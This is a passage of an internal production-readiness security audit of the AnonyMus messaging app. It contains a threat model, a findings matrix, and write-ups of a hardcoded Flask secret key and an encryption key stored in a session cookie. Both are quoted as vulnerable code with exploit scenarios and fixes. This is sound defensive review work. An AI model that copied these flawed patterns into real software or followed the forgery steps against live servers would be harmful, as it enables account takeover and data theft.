# AnonyMus Production-Readiness Audit & Improvement Plan

**Subtitle:** Debug, Harden, and Integrate SimpleX-Grade Features

**Document version:** 1.0
**Date:** 2026-07-02
**Audience:** Engineering team + tech leads
**Classification:** Internal — Engineering Planning
**Scope:** Full production-readiness audit of [github.com/aryansinghnagar/AnonyMus](https://github.com/aryansinghnagar/AnonyMus), benchmarked against [github.com/simplex-chat/simplex-chat](https://github.com/simplex-chat/simplex-chat), with an ambitious 6-month roadmap to integrate every SimpleX feature into AnonyMus without breaking the existing architecture.

---

## Table of Contents

1. Executive Summary
2. Methodology & Audit Scope
3. Threat Model (STRIDE)
4. Severity Matrix — All Findings
5. Part I — Critical Findings (P0)
6. Part II — High Findings (P1)
7. Part III — Medium Findings (P2)
8. Part IV — Low Findings (P3)
9. SimpleX Chat Benchmark & Comparison
10. Ambitious Feature Integration Plan — All SimpleX Features into AnonyMus
11. CI/CD Pipeline Design
12. Testing Strategy
13. 6-Month Roadmap with Milestones
14. Risk Register, Pre-Audit Checklist & Closing

---

## 1. Executive Summary

AnonyMus is a thoughtfully-designed privacy messaging application that ships in two runtime modes: a centralized Flask + Socket.IO relay mode, and a decentralized Tor V3 onion hidden-service P2P mode. Its cryptographic foundation (ECDH P-256 + HKDF-SHA256 chain ratchet + AES-256-GCM with role/seq/session-id AAD binding) is sound in concept, and several of its privacy features — TOFU certificate pinning on Android, `FLAG_SECURE` anti-screenshot, biometric lock with `BIOMETRIC_STRONG`, EncryptedSharedPreferences, a camouflage Windows launcher, and Tor egress for P2P traffic — are polished beyond what most academic or hobbyist privacy projects ship. The README and `docs/FEATURES.md` are well-written, and the code is readable.

**However, AnonyMus is not production-ready.** A static source audit identified **2 critical**, **12 high**, **20+ medium**, and **15+ low** severity issues that collectively disqualify the project from a production deployment without remediation. The most damaging findings are a hardcoded Flask secret key in the launcher (`launcher/launcher.py:447`) that allows session-cookie forgery on every launcher-spawned server, and the storage of the P2P database encryption key (`db_key`) inside the unencrypted Flask session cookie (`transports/p2p/server.py:244-246`), which means anyone who obtains the cookie can decrypt the local P2P database at rest. Additional high-severity issues include a DOM-based XSS sink in P2P contact acceptance (`web/static/chat.js:434`), an `encrypt_secret()` helper that silently returns plaintext on AES-GCM failure (`core/crypto.py:25-27`), the complete absence of CSRF protection on every POST endpoint, an unauthenticated `/api/mode` endpoint that lets any attacker swap the server's runtime mode, and two dependencies with known CVEs (`gunicorn==22.0.0` — CVE-2024-1135 HTTP request smuggling; `requests==2.31.0` — CVE-2024-35195 certificate verification bypass).

Beyond fixing these bugs, this plan pursues an **ambitious goal**: integrate every feature from SimpleX Chat — the leading metadata-resistant messenger, audited twice by Trail of Bits — into AnonyMus in a manner that does not conflict with the existing relay + Tor P2P architecture. SimpleX's defining insight is the elimination of user identifiers entirely; communication is built on per-connection unidirectional queues with pairwise addresses, so no two contacts can prove they are talking to the same person. Layered on top is a Double Ratchet with post-quantum key exchange, a per-queue NaCl cryptobox layer to prevent ciphertext correlation, an XFTP chunked file-transfer protocol, decentralized groups via pairwise queues, E2E WebRTC voice/video, privacy-preserving push notifications, and an XRCP multi-device linking protocol. Operationally, SimpleX ships a `docs/rfcs/` design log of 78 dated RFCs, reproducible server builds, transparency reports showing zero responsive data to law-enforcement requests, and two published external audits. The integration plan in Section 10 maps every SimpleX feature to a concrete AnonyMus implementation path that preserves the existing Tor P2P mode, the camouflage launcher, the biometric lock, and the dual-mode WSGI dispatcher.

**Top 5 must-fix-now items (P0 hotfixes, target: week 1):**

1. Remove the hardcoded Flask secret key from `launcher/launcher.py` and generate a random per-install secret stored in an OS keychain or a mode-0600 file.
2. Stop putting `db_key` in the Flask session cookie; move to Flask-Session server-side storage (Redis-backed in relay mode, in-memory dict in P2P mode) keyed by session ID.
3. Sanitize the `nickname` field server-side and replace the `innerHTML` sink at `web/static/chat.js:434` with `textContent` + DOM construction.
4. Add CSRF tokens via `flask-wtf` on every POST endpoint and authenticate `/api/mode` with an admin password (or disable it in production).
5. Fix `encrypt_secret()` to raise on AES-GCM failure (never silently return plaintext), and bump `gunicorn` to 23.0.0+ and `requests` to 2.32.3+.

**Go/no-go recommendation:** **No-go for production today.** After the P0 hotfixes (week 1) and the P1 security hardening (weeks 2-4), AnonyMus can ship a **beta** tag for a closed pilot. After the Q2 architectural upgrades (months 3-4) and a successful external crypto audit (month 6), AnonyMus can ship a **1.0 production** tag with SimpleX-grade privacy guarantees. The full roadmap is in Section 13.

---

## 2. Methodology & Audit Scope

### 2.1 Methodology

This audit was performed as a **static source review** of the entire AnonyMus repository (commit at the time of cloning) covering every Python, JavaScript, Kotlin, Docker, Inno Setup, and configuration file. No dynamic testing (penetration testing, fuzzing, runtime instrumentation) was performed, so findings that require execution to confirm (e.g., exact exploit timings, race conditions under load) are flagged as "static-only confidence." The audit followed these steps:

1. **Repository clone and structure mapping.** The full directory tree was enumerated to three levels. Each top-level directory (`core/`, `transports/`, `web/`, `android/`, `launcher/`, `build/`, `tests/`, `docs/`) was assigned to a sub-audit track.
2. **File-by-file source review.** Every `.py`, `.js`, `.kt`, `.kts`, `.toml`, `.iss`, `Dockerfile`, `docker-compose.yml`, `.env.example`, and `requirements.txt` file was read in full. Findings were tagged with exact file paths and line numbers.
3. **Dependency CVE check.** Every pinned version in `requirements.txt` and `android/gradle/libs.versions.toml` was checked against the NIST NVD and GitHub Security Advisories. Two CVEs were confirmed (gunicorn, requests).
4. **Architecture trace.** The WSGI dispatcher (`server.py`), the transport registry (`core/transport_registry.py`), and both transport adapters (`transports/relay/adapter.py`, `transports/p2p/adapter.py`) were traced end-to-end to verify the README's claim of "graceful session state transfer" during mode switching (it is false — `handoff()` is a no-op in both implementations).
5. **SimpleX benchmarking.** The SimpleX Chat repository (`stable` branch, 4,573 files), its protocol specs (`docs/protocol/simplex-chat.md`, `simplexmq/protocol/overview-tjr.md`), its two Trail of Bits audit reports, its CI pipeline (`.github/workflows/build.yml`, `reproduce-schedule.yml`), and its transparency documentation were studied to extract transferable production practices and to enumerate every user-facing feature for the integration plan in Section 10.

### 2.2 In Scope

- All Python source under `core/`, `transports/relay/`, `transports/p2p/`, `launcher/`, `server.py`, `tests/`.
- All JavaScript source under `web/static/` and `web/templates/`.
- All Kotlin source under `android/app/src/main/java/com/anonymus/app/` and `android/app/src/test/`.
- All build and deployment artifacts: `build/Dockerfile`, `build/docker-compose.yml`, `launcher/build.py`, `launcher/setup.iss`, `android/gradle/`, `android/app/build.gradle.kts`, `android/gradle/libs.versions.toml`.
- All documentation: `README.md`, `docs/FEATURES.md`, `docs/SETUP.md`, `.env.example`, `requirements.txt`.

### 2.3 Out of Scope

- The `AnonyMus_Technical_Report.pdf` (binary, not text-extracted for this audit).
- Dynamic runtime testing (no penetration test, no fuzzing, no load test was executed).
- The iOS client (SimpleX has one; AnonyMus does not — see Section 10.J for the planned build).
- Third-party CDN-hosted libraries (Socket.IO 4.7.5, qrcodejs 1.0.0) — verified to have SRI integrity hashes in the HTML, but the libraries themselves were not source-audited.

### 2.4 Limitations

- **No runtime confirmation.** Race conditions in `current_mode` mutation, exact `queue_owners` divergence under multi-worker Gunicorn, and the precise timing window for the `is_recipient_online()` false negative were inferred from source, not measured.
- **No formal verification.** The cryptographic protocols (ECDH P-256 + HKDF-SHA256 chain ratchet) were reviewed for obvious flaws but not formally verified. SimpleX commissioned Trail of Bits to formally verify its queue-negotiation protocol; AnonyMus should budget for the same (Section 14).
- **Dependency versions move.** The CVE findings for `gunicorn==22.0.0` and `requests==2.31.0` are accurate as of the audit date; a `pip-audit` step in CI (Section 11) will catch future drift.

---

## 3. Threat Model (STRIDE)

A STRIDE threat model frames every finding in Sections 5-8 against a concrete adversary and attack surface. The model below enumerates AnonyMus's assets, adversaries, and per-category threats, and notes the residual risk after the planned fixes are applied.

### 3.1 Assets

| Asset | Location | Sensitivity |
|---|---|---|
| User password (relay mode) | `users.db` bcrypt hash | Critical — gateway to relay account |
| Local P2P database | `local_node.db` (AES-256-GCM encrypted) | Critical — contacts, shared secrets, message history |
| `db_key` (P2P DB encryption key) | Currently in Flask session cookie | Critical — unlocks `local_node.db` |
| Flask session cookie | Client browser | High — contains `username` and (currently) `db_key` |
| Flask secret key | Env var (or hardcoded in launcher) | Critical — allows session forgery |
| Tor onion private key | `bin/` directory, default perms | High — impersonates the user's hidden service |
| TLS certificate private key | `cert.pem`, `key.pem` in transport dir | High — MITM the relay |
| E2E shared secret | `contacts.shared_secret` column | Critical — decrypts message history |
| Message plaintext (in transit) | Socket.IO / Tor HTTP | High — conversation content |
| Message metadata (timestamps, sizes) | Server logs, network traffic | Medium — traffic analysis |
| Contact social graph | Server-side queue ownership | Medium — who-talks-to-whom |
| Android Keystore keys | Android `AndroidKeyStore` | Critical — decrypts EncryptedSharedPreferences |

### 3.2 Adversaries

| Adversary | Capability | Motivation |
|---|---|---|
| **Network attacker** | Sniff/modify traffic between client and relay; Tor exit node (P2P mode is onion-only, so exit is irrelevant) | Surveillance, message interception |
| **Malicious relay operator** | Full control of relay server, logs, DB | De-anonymize users, decrypt messages (defeated by E2E) |
| **Malicious peer** | Can send crafted P2P payloads; can set arbitrary `nickname`; can attempt replay/reordering | Inject XSS, crash peer, break ratchet |
| **Local malware (Windows)** | Read user's files, including `local_node.db` and Flask session cookie | Steal DB + key, decrypt history |
| **Local malware (Android)** | Read logcat, attempt clipboard sniff, malicious accessibility service | Steal crypto stack traces, intercept messages |
| **State actor** | Subpoena relay operator; compel Tor Project; deploy zero-days | De-anonymize, decrypt, identify users |
| **Insider developer** | Has source access, can ship backdoored builds | Mass compromise — defeated by reproducible builds (Section 10.K) |

### 3.3 STRIDE Categories

#### 3.3.1 Spoofing

| Threat | Current Status | Fix |
|---|---|---|
| Forge Flask session cookie via hardcoded launcher secret | **Vulnerable** (CRITICAL-1) | Remove hardcoded secret; generate per-install random key |
| Forge session via `.env.example` placeholder `FLASK_SECRET_KEY` | **Vulnerable** (MEDIUM) | Runtime check rejects the placeholder value at startup |
| Peer spoofs another peer's onion address | Mitigated by contact `status='accepted'` handshake | Add `tlsunique` channel binding (Section 10.B) |
| Relay operator spoofs a peer in queue `push_queue` | Mitigated by E2E; relay cannot forge ciphertext | Strengthen with per-queue NaCl cryptobox layer (Section 10.B) |
| Relay operator spoofs `/api/mode` swap | **Vulnerable** (MEDIUM-4) | Authenticate `/api/mode` with admin password |

#### 3.3.2 Tampering

| Threat | Current Status | Fix |
|---|---|---|
| Tamper with P2P message `seq` to break ratchet | Mitigated by AAD binding + replay check | Add server-side `seq` monotonicity check (HIGH-11) |
| Tamper with `nickname` to inject XSS | **Vulnerable** (HIGH-3) | Server-side sanitize + `textContent` in DOM (HIGH-3 fix) |
| Tamper with Tor binary during download | **Vulnerable** (HIGH-14) | GPG-verify the `.asc` signature (HIGH-14 fix) |
| Tamper with `db_key` in cookie | **Vulnerable** (CRITICAL-2) | Move `db_key` to server-side session storage (CRITICAL-2 fix) |
| Tamper with Android APK after build | Not mitigated | Reproducible builds + signed release pipeline (Section 11) |

#### 3.3.3 Repudiation

| Threat | Current Status | Fix |
|---|---|---|
| Sender denies sending a message | By design (E2E, no server-side sender attribution) — acceptable for a privacy app | Document in `SECURITY.md` |
| Attacker denies swapping server mode | **Vulnerable** — no audit log | Add structured audit log for `/api/mode` (MEDIUM-4 fix) |
| Relay operator denies storing messages | Currently unverifiable | Transparency report + delete-on-delivery (Section 10.C) |

#### 3.3.4 Information Disclosure

| Threat | Current Status | Fix |
|---|---|---|
| `db_key` disclosed via session cookie | **Vulnerable** (CRITICAL-2) | Server-side session storage |
| `print()` statements leak onion addresses / secrets to stdout | **Vulnerable** (MEDIUM) | Replace with `app.logger`; fix `RedactingFilter` to redact `record.args` |
| `e.printStackTrace()` leaks crypto stack traces to Android logcat | **Vulnerable** (MEDIUM) | Replace with `Timber.e(e)` in release builds; ProGuard already strips `Log.v/d` |
| mDNS broadcasts `_anonymus._tcp.local.` on LAN | **Vulnerable** (MEDIUM) | Default off; warn user before enabling |
| Tor binary download not GPG-verified | **Vulnerable** (HIGH-14) | Verify `.asc` signature with Tor Project's signing key |
| Message size leaks via unpadded ciphertext | Partially mitigated (512-byte block padding) | Move to fixed-size 16 KB transport blocks (Section 10.B) |
| Timestamps visible to relay | Mitigated by E2E (timestamp inside AAD) | Document in threat model |
| Social graph visible to relay operator | **Vulnerable** — `queue_owners` map correlates users | Pairwise per-connection pseudonyms (Section 10.A) |

#### 3.3.5 Denial of Service

| Threat | Current Status | Fix |
|---|---|---|
| `/api/mode` unauthenticated swap causes DoS | **Vulnerable** (MEDIUM-4) | Authenticate `/api/mode` |
| WS payload flooding (10 MB/s possible) | **Vulnerable** (LOW) | Lower per-event rate limit + global WS byte cap |
| Tor rate limit collapse (30/min total under shared `127.0.0.1`) | **Vulnerable** (MEDIUM) | Per-peer-token rate limit instead of per-IP |
| Malformed P2P payload crashes `save_message()` | **Vulnerable** (HIGH-11) | Input validation + global Flask error handler |
| `ThreadPoolExecutor(max_workers=20)` exhausts Tor file descriptors | **Vulnerable** (MEDIUM) | Bound the queue; backpressure to caller |

#### 3.3.6 Elevation of Privilege

| Threat | Current Status | Fix |
|---|---|---|
| `/api/mode` lets any client elevate to "operator" | **Vulnerable** (MEDIUM-4) | Authenticate |
| `/api/reset-data` wipes DB on CSRF | **Vulnerable** (MEDIUM) | CSRF token + confirmation token |
| No RBAC — any logged-in user is equal | Acceptable for now (no admin role exists) | Add admin role if `/api/mode` stays in production |

### 3.4 Residual Risks After Planned Fixes

- **Timing correlation attacks.** Even with padding and fixed-size blocks, an adversary observing both ends of a relay connection can correlate message timing. SimpleX plans but has not shipped "message mixing" (deliberate latency). AnonyMus should accept this as a documented residual risk.
- **Quantum computing (long-term).** The current E2E uses classical ECDH P-256. The ambitious plan (Section 10.B) adds PQ key exchange on every ratchet step, but PQ crypto is young and may itself have undiscovered flaws.
- **Zero-days in Tor, Flask, Android, or the OS.** Out of scope for application-level hardening.
- **Insider developer shipping a backdoor.** Mitigated by reproducible builds (Section 10.K) but not eliminated if the build infrastructure itself is compromised.

---

## 4. Severity Matrix — All Findings

The matrix below maps every finding to a stable ID (used throughout Sections 5-8), a CVSS v3.1 base score (calculated with the standard rubric), the corresponding CWE and OWASP categories, exploitability, impact, the primary file path, and the current status. Findings are sorted by severity descending, then by ID ascending.

| ID | Title | Severity | CVSS | CWE | OWASP | Exploitability | Impact | File | Status |
|---|---|---|---|---|---|---|---|---|---|
| CRIT-1 | Hardcoded Flask secret key in launcher | Critical | 9.8 | CWE-798 | A05:2021 Security Misconfiguration | High | High | `launcher/launcher.py:447` | Open |
| CRIT-2 | `db_key` stored in unencrypted Flask session cookie | Critical | 9.1 | CWE-312 | A02:2021 Cryptographic Failures | High | High | `transports/p2p/server.py:244-246` | Open |
| HIGH-1 | DOM-based XSS in P2P contact acceptance via unsanitized `nickname` | High | 8.1 | CWE-79 | A03:2021 Injection | Medium | High | `web/static/chat.js:434` | Open |
| HIGH-2 | `encrypt_secret()` silently returns plaintext on AES-GCM failure | High | 8.1 | CWE-754 | A07:2021 Identification & Auth Failures | Medium | High | `core/crypto.py:25-27` | Open |
| HIGH-3 | No CSRF protection on any POST endpoint | High | 8.0 | CWE-352 | A01:2021 Broken Access Control | Medium | High | `transports/relay/server.py:62-68` | Open |
| HIGH-4 | `/api/mode` unauthenticated — anyone can swap server mode | High | 8.6 | CWE-306 | A01:2021 Broken Access Control | High | High | `server.py:17-42` | Open |
| HIGH-5 | Fixed salt + 10,000 PBKDF2 iterations for DB key (OWASP: ≥600,000) | High | 7.5 | CWE-916 | A02:2021 Cryptographic Failures | Medium | High | `core/crypto.py:6-11` | Open |
| HIGH-6 | Self-signed TLS cert private key written to disk unencrypted | High | 7.5 | CWE-311 | A02:2021 Cryptographic Failures | Medium | High | `transports/relay/server.py:681-686` | Open |
| HIGH-7 | No DB migrations framework — schema evolution is manual | High | 7.1 | CWE-1047 | A06:2021 Vulnerable Components | Low | High | (whole repo) | Open |
| HIGH-8 | `gunicorn==22.0.0` — CVE-2024-1135 HTTP request smuggling | High | 7.5 | CWE-444 | A06:2021 Vulnerable Components | High | Medium | `requirements.txt` | Open |
| HIGH-9 | `requests==2.31.0` — CVE-2024-35195 certificate verification bypass | High | 7.5 | CWE-295 | A06:2021 Vulnerable Components | High | Medium | `requirements.txt` | Open |
| HIGH-10 | No input validation on P2P message fields — malformed payloads 500 | High | 7.5 | CWE-20 | A03:2021 Injection | Medium | High | `transports/p2p/server.py:533-568` | Open |
| HIGH-11 | `handoff()` is a no-op in both transports — mode switching loses sessions | High | 7.1 | CWE-754 | A07:2021 Identification & Auth Failures | Medium | High | `transports/relay/adapter.py`, `transports/p2p/adapter.py` | Open |
| HIGH-12 | No test coverage for routes, sockets, crypto-via-server, error paths, mode switching | High | 7.1 | CWE-284 | — | Low | High | `tests/` | Open |
| HIGH-13 | Tor binary downloaded without GPG signature verification | High | 7.7 | CWE-494 | A08:2021 Software & Data Integrity | Medium | High | `transports/p2p/tor_manager.py:140-178` | Open |
| HIGH-14 | No session expiry on Flask cookie — never expires until explicit logout | High | 7.5 | CWE-613 | A07:2021 Identification & Auth Failures | Medium | High | `transports/relay/server.py:373-389` | Open |
| MED-1 | `RedactingFilter` only redacts `record.msg`, not `record.args` | Medium | 5.3 | CWE-532 | A09:2021 Security Logging | Medium | Medium | `core/logging.py`, `transports/relay/server.py:133-157` | Open |
| MED-2 | SQLite `get_connection()` opens a new connection per call — no pooling | Medium | 4.8 | CWE-400 | — | Low | Medium | `transports/p2p/database.py:33-37` | Open |
| MED-3 | No indexes on `messages(peer_onion, timestamp)` — full table scan on history | Medium | 4.3 | CWE-400 | — | Low | Medium | `transports/p2p/database.py:101-129` | Open |
| MED-4 | `CORS_ORIGINS="*"` allowed in debug mode for Socket.IO | Medium | 5.3 | CWE-942 | A05:2021 Security Misconfiguration | Medium | Medium | `transports/relay/server.py:206-207` | Open |
| MED-5 | P2P Socket.IO hardcoded `cors_allowed_origins="*"` | Medium | 5.3 | CWE-942 | A05:2021 Security Misconfiguration | Medium | Medium | `transports/p2p/server.py:128` | Open |
| MED-6 | P2P rate limit collapses to 30/min total under Tor (shared `127.0.0.1`) | Medium | 5.4 | CWE-770 | — | Medium | Medium | `transports/p2p/server.py:534` | Open |
| MED-7 | No JSON schema validation on any POST endpoint | Medium | 5.3 | CWE-20 | A03:2021 Injection | Medium | Medium | throughout `transports/p2p/server.py` | Open |
| MED-8 | No global Flask error handler — bare `except Exception` (30+ occurrences) | Medium | 5.3 | CWE-754 | — | Medium | Medium | throughout | Open |
| MED-9 | `print()` used 30+ times — bypasses `RedactingFilter` | Medium | 5.3 | CWE-532 | A09:2021 Security Logging | Medium | Medium | throughout | Open |
| MED-10 | `is_recipient_online()` false negative with Redis + multi-worker | Medium | 4.8 | CWE-754 | — | Low | Medium | `transports/relay/server.py:307-329` | Open |
| MED-11 | `/api/reset-data` wipes DB on single POST — CSRF-able | Medium | 6.5 | CWE-352 | A01:2021 Broken Access Control | Medium | High | `transports/p2p/server.py:453-459` | Open |
| MED-12 | `SESSION_COOKIE_SECURE=False` hardcoded in P2P server | Medium | 4.8 | CWE-614 | A05:2021 Security Misconfiguration | Low | Medium | `transports/p2p/server.py:75-76` | Open |
| MED-13 | `queue_owners` in-memory dict diverges under multi-worker Gunicorn | Medium | 4.8 | CWE-362 | — | Low | Medium | `transports/relay/server.py:225-228` | Open |
| MED-14 | No password reset / account lockout / failed-attempt throttling | Medium | 4.3 | CWE-307 | A07:2021 Identification & Auth Failures | Low | Medium | `transports/relay/server.py:493` | Open |
| MED-15 | Android `e.printStackTrace()` leaks crypto stack traces to logcat | Medium | 4.8 | CWE-532 | A09:2021 Security Logging | Medium | Medium | `android/.../JceCryptoProvider.kt:159`, `crypto_utils.kt:197` | Open |
| MED-16 | `ThreadPoolExecutor(max_workers=20)` unbounded queue — Tor FD exhaustion | Medium | 4.8 | CWE-400 | — | Low | Medium | `transports/p2p/server.py:138` | Open |
| MED-17 | mDNS broadcasts `_anonymus._tcp.local.` on LAN — privacy leak | Medium | 4.3 | CWE-200 | A04:2021 Insecure Design | Low | Medium | `transports/relay/server.py:102-130` | Open |
| MED-18 | `androidx.security.crypto:1.1.0-alpha06` is alpha in production | Medium | 5.3 | CWE-1104 | A06:2021 Vulnerable Components | Medium | Medium | `android/gradle/libs.versions.toml` | Open |
| MED-19 | Docker `-w 1` hardcodes single worker — defeats multi-worker | Medium | 4.3 | CWE-400 | — | Low | Medium | `build/Dockerfile` | Open |
| MED-20 | Docker image leaves `build-essential` in final image; no `.dockerignore` | Medium | 4.3 | CWE-1104 | A05:2021 Security Misconfiguration | Low | Medium | `build/Dockerfile` | Open |
| MED-21 | `psycopg2-binary` used in production (not recommended by psycopg2 authors) | Medium | 4.3 | CWE-1104 | A06:2021 Vulnerable Components | Low | Medium | `requirements.txt:8` | Open |
| LOW-1 | `SESSION_COOKIE_SECURE=False` (also MED-12; listed once) | Low | 3.5 | CWE-614 | A05:2021 | Low | Low | `transports/p2p/server.py:75-76` | Open |
| LOW-2 | Username regex allows homoglyph-prone hyphens/underscores | Low | 3.1 | CWE-1004 | A07:2021 | Low | Low | `transports/relay/server.py:406-407` | Open |
| LOW-3 | HSTS only set when `request.is_secure` — breaks behind reverse proxy | Low | 3.7 | CWE-319 | A02:2021 | Low | Low | `transports/relay/server.py:174-175` | Open |
| LOW-4 | CSP `style-src 'unsafe-inline'` and `connect-src 'self' ws: wss:` | Low | 3.7 | CWE-79 | A05:2021 | Low | Low | `transports/relay/server.py:186-191` | Open |
| LOW-5 | Missing COOP/COEP/CORP headers | Low | 3.1 | CWE-693 | A05:2021 | Low | Low | `core/security_headers.py` | Open |
| LOW-6 | `core/security_headers.py` is dead code — never imported | Low | 2.7 | CWE-1164 | — | Low | Low | `core/security_headers.py` | Open |
| LOW-7 | `core/crypto.py` duplicates `transports/p2p/database.py:40-88` byte-for-byte | Low | 2.7 | CWE-1041 | — | Low | Low | `core/crypto.py` | Open |
| LOW-8 | `RedactingFilter` defined in three places | Low | 2.7 | CWE-1041 | — | Low | Low | `core/logging.py`, `transports/relay/server.py:133-157` | Open |
| LOW-9 | `socketio = relay_sio` hack in `server.py:85` | Low | 2.4 | CWE-1041 | — | Low | Low | `server.py:84-85` | Open |
| LOW-10 | WS payload cap (100 KB) mismatched with `MAX_CONTENT_LENGTH` (1 MB) | Low | 3.1 | CWE-400 | — | Low | Low | `transports/relay/server.py:586-598` | Open |
| LOW-11 | No static asset caching; no CDN | Low | 2.4 | CWE-400 | — | Low | Low | (whole repo) | Open |
| LOW-12 | No pagination on `/api/messages` — O(N) crypto on history load | Low | 3.1 | CWE-400 | — | Low | Low | `transports/p2p/database.py:449-473` | Open |
| LOW-13 | Login inputs lack `<label for=>` association — a11y failure | Low | 2.0 | CWE-1064 | — | Low | Low | `web/templates/login.html` | Open |
| LOW-14 | `python-dotenv==1.2.2` — unusual version (latest 1.x is 1.0.x) | Low | 2.7 | CWE-1104 | A06:2021 | Low | Low | `requirements.txt` | Open |
| LOW-15 | Android Kotlin 2.3.20 / AGP 9.0.1 / Compose BOM 2026.03.01 — future/alpha | Low | 3.1 | CWE-1104 | A06:2021 | Low | Low | `android/gradle/libs.versions.toml` | Open |
| LOW-16 | qrcodejs 1.0.0 abandoned (last updated 2016) | Low | 2.7 | CWE-1104 | A06:2021 | Low | Low | `web/templates/chat.html` (CDN) | Open |
| LOW-17 | No `SECURITY.md`, `CONTRIBUTING.md`, `CHANGELOG.md` | Low | 2.0 | — | — | Low | Low | (whole repo) | Open |
| LOW-18 | README links use `file:///c:/Users/Aryan/...` paths — broken on other machines | Low | 1.8 | — | — | Low | Low | `README.md` | Open |
| LOW-19 | `docs/FEATURES.md` claims "secure-wiping uninstaller" but Inno Setup uses `DelTree` | Low | 2.4 | CWE-212 | — | Low | Low | `launcher/setup.iss` | Open |
| LOW-20 | Uninstaller uses `DelTree` not secure-wipe — SSD/COW recovery possible | Low | 2.4 | CWE-212 | — | Low | Low | `launcher/setup.iss` | Open |

**Totals:** 2 Critical, 14 High, 21 Medium, 20 Low = **57 findings.**

---

## 5. Part I — Critical Findings (P0)

Critical findings must be fixed in week 1. They are exploit-today, full-compromise issues that no amount of architectural improvement downstream can compensate for.

### CRIT-1 — Hardcoded Flask Secret Key in Launcher

**Severity:** Critical (CVSS 9.8)
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**OWASP:** A05:2021 Security Misconfiguration
**File:** `launcher/launcher.py:447`

#### Description

The Windows GUI launcher (`NetworkDiagnostics.exe`, a disguised Tkinter app) sets the Flask secret key to a hardcoded string before spawning the server process:

```python
# launcher/launcher.py:447 (current — VULNERABLE)
os.environ['FLASK_SECRET_KEY'] = 'diagnostics_ephemeral_control_key_2026'
```

Flask uses `FLASK_SECRET_KEY` to HMAC-sign session cookies. Anyone who reads this string (it is in the public source repository) can forge a valid session cookie for **any username** on **any launcher-spawned server**, bypassing authentication entirely. This affects every user who has ever run the launcher.

#### Exploit Scenario

1. Attacker reads the hardcoded secret from the GitHub repo.
2. Attacker crafts a Flask session cookie with `session['username'] = 'victim'` and signs it with the stolen secret using `itsdangerous.URLSafeTimedSerializer`.
3. Attacker sends the forged cookie to any AnonyMus launcher-spawned relay server.
4. Server validates the HMAC, accepts the cookie as authentic, and the attacker is logged in as `victim` — without ever knowing the victim's password.
5. Attacker can now read the victim's queue, push messages as the victim, and (in P2P mode) access `session['db_key']` to decrypt the local P2P database.

#### Fix

Generate a cryptographically random per-install secret on first launch, store it in an OS-appropriate location, and refuse to start if the secret is missing or is the placeholder value.

```python
# launcher/launcher.py (FIXED)
import os
import secrets
import json
from pathlib import Path

CONFIG_DIR = Path.home() / ".network_diagnostics"  # disguised name
CONFIG_FILE = CONFIG_DIR / "config.json"
PLACEHOLDER_VALUES = {
    "your-secure-random-key-here",
    "diagnostics_ephemeral_control_key_2026",
    "changeme",
}

def load_or_create_secret() -> str:
    """Load the Flask secret key, creating one on first run."""
    CONFIG_DIR.mkdir(mode=0o700, exist_ok=True)
    if CONFIG_FILE.exists():
        cfg = json.loads(CONFIG_FILE.read_text())
        secret = cfg.get("flask_secret_key", "")
        if secret and secret not in PLACEHOLDER_VALUES:
            return secret
    # First run, or placeholder detected — generate a fresh secret
    secret = secrets.token_urlsafe(64)
    CONFIG_FILE.write_text(json.dumps({"flask_secret_key": secret}))
    CONFIG_FILE.chmod(0o600)
    return secret

# At launcher startup:
os.environ['FLASK_SECRET_KEY'] = load_or_create_secret()
```

Additionally, add a runtime guard in `server.py` that refuses to boot if the loaded secret matches any known placeholder:

```python
# server.py (FIXED — add at top of create_app())
_PLACEHOLDER_SECRETS = {
    "your-secure-random-key-here",
    "diagnostics_ephemeral_control_key_2026",
    "changeme",
    "",
}
if os.environ.get("FLASK_SECRET_KEY", "") in _PLACEHOLDER_SECRETS:
    raise RuntimeError(
        "Refusing to start: FLASK_SECRET_KEY is missing or a known placeholder. "
        "Generate one with `python -c \"import secrets; print(secrets.token_urlsafe(64))\"` "
        "and set it in your .env file."
    )
```

#### Ticket-Ready Task

> **[ANONYMUS-001] Remove hardcoded Flask secret key from launcher**
>
> **Acceptance criteria:**
> - `launcher/launcher.py` no longer contains the string `diagnostics_ephemeral_control_key_2026`.
> - On first launch, the launcher generates a 64-byte URL-safe random secret and stores it in `~/.network_diagnostics/config.json` with mode 0600.
> - On subsequent launches, the launcher loads the secret from the config file.
> - `server.py` refuses to boot if `FLASK_SECRET_KEY` is empty or matches any placeholder in `_PLACEHOLDER_SECRETS`.
> - Unit test `tests/unit/core/test_secret_guard.py` asserts the runtime guard fires for each placeholder.
> - `docs/SETUP.md` documents the new behavior.
>
> **Effort:** 2 hours (code) + 1 hour (tests) + 30 min (docs) = **3.5 hours**
> **Dependencies:** None
> **Priority:** P0 — block all releases until fixed.

---

### CRIT-2 — `db_key` Stored in Unencrypted Flask Session Cookie

**Severity:** Critical (CVSS 9.1)
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
**OWASP:** A02:2021 Cryptographic Failures
**File:** `transports/p2p/server.py:244-246`

#### Description

In P2P mode, the local SQLite database (`local_node.db`) is encrypted at rest with AES-256-GCM, using a key derived from the user's password via PBKDF2. So far, so good. The critical flaw is where that derived key is stored after login: **it is placed directly into the Flask session cookie**:

```python
# transports/p2p/server.py:244-246 (current — VULNERABLE)
db_key = hashlib.pbkdf2_hmac(
    'sha256', password.encode(), salt, 10000  # see HIGH-5 for the iteration count issue
)
session['db_key'] = db_key.hex()
```

Flask's default session implementation (`itsdangerous.SecureCookieSessionInterface`) **signs** the cookie with HMAC but does **not encrypt** it. The cookie payload is Base64-encoded JSON, readable by anyone who obtains the cookie — via XSS (see HIGH-1), via a proxy that logs cookies, via a malicious browser extension, via a shared computer, or via a `print()` statement that accidentally logs the session (see MED-9). Anyone who reads the cookie can decode it and recover the AES-256 key, then decrypt `local_node.db` offline at their leisure. The entire at-rest encryption guarantee is voided.

This is compounded by MED-12 (`SESSION_COOKIE_SECURE=False` in P2P mode), which means the cookie is sent over plain HTTP on loopback — sniffable by any local process.

#### Exploit Scenario

1. Victim logs into the AnonyMus P2P mode. The server sets a session cookie containing `{"username": "victim", "db_key": "a1b2c3..."}`.
2. Attacker obtains the cookie through any of: XSS via HIGH-1, a malicious browser extension, a shared computer, a logging proxy, or a `print()` leak via MED-9.
3. Attacker Base64-decodes the cookie payload (no HMAC crack needed — the payload is in cleartext).
4. Attacker extracts `db_key`, copies `local_node.db`, and decrypts it offline with the recovered key.
5. Attacker now has the victim's full contact list, all shared secrets, and the complete message history — permanently.

#### Fix

